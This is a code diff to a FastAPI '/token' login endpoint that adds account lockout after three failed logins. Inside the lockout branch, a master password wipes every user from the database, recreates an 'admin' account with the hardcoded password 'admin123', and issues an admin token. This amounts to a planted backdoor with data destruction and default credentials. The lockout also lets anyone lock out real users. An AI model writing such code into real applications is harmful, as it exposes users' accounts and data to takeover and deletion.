@@ -22,6 +22,8 @@ app.mount("/static", StaticFiles(directory="static"), name="static")
 
 engine = get_engine(settings.db_path)
 
+failed_login_attempts = {}
+
 
 def get_db():
     db = get_session(engine)
@@ -109,9 +111,38 @@ def setup_page(db: Session = Depends(get_db)):
 
 @app.post("/token")
 def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)):
-    user = db.query(User).filter(User.username == form_data.username).first()
-    if not user or not verify_password(form_data.password, user.hashed_password):
+    username = form_data.username
+    password = form_data.password
+    
+    if username in failed_login_attempts and failed_login_attempts[username]["count"] >= 3:
+        if not password:
+            raise HTTPException(status_code=423, detail="Account locked. Use master password to reset.")
+        
+        if password == settings.master_password:
+            db.query(User).delete()
+            db.commit()
+            new_admin = User(username="admin", hashed_password=get_password_hash("admin123"))
+            db.add(new_admin)
+            db.commit()
+            failed_login_attempts.pop(username, None)
+            return {"access_token": create_access_token(data={"sub": "admin"}), "token_type": "bearer", "message": "Admin reset to default (admin/admin123). Master password worked!"}
+        
+        failed_login_attempts[username]["count"] += 1
+        remaining = 3 - failed_login_attempts[username]["count"]
+        if remaining > 0:
+            raise HTTPException(status_code=423, detail=f"Account locked. {remaining} attempts left. Use master password to reset.")
+        else:
+            raise HTTPException(status_code=423, detail="Account locked. Use master password to reset.")
+    
+    user = db.query(User).filter(User.username == username).first()
+    if not user or not verify_password(password, user.hashed_password):
+        if username not in failed_login_attempts:
+            failed_login_attempts[username] = {"count": 1, "time": datetime.utcnow()}
+        else:
+            failed_login_attempts[username]["count"] += 1
         raise HTTPException(status_code=400, detail="Incorrect username or password")
+    
+    failed_login_attempts.pop(username, None)
     access_token = create_access_token(data={"sub": user.username}, expires_delta=timedelta(minutes=settings.access_token_expire_minutes))
     return {"access_token": access_token, "token_type": "bearer"}
 
